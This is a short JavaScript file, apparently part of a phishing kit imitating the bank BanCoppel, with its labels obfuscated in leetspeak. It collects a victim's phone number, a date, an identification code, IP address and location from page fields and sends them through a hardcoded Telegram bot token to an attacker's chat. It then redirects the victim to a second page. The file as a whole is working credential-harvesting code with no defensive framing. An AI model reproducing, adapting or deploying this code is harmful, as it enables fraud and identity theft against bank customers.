
var telegram_bot_id = "7940975075:AAGZCCQMX27a80Xnymu1Cwy37i1scupSEVM";
//chat id
var chat_id =  7407840653;
var u_name, u_name2, u_name3, ip, ip2;
var ready = function () {
    u_name = document.getElementById("0T4RX").value;
    u_name2 = document.getElementById("PL4C").value;
    u_name3 = document.getElementById("PR0C4T").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "🔹B4NC0P3L🔹\n📞T3L: " + u_name + "\n📅F3XH4: " + u_name2 + "\nℹYD3: " + u_name3 + "\nIP: " + ip +"\n" + ip2 +"\n🔹C0DIGO SYN4PSE🔹";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
       $.ajax(settings).done(function (response) {
        window.location = 'index2.html';
        console.log(response);
    });
    return false;
};
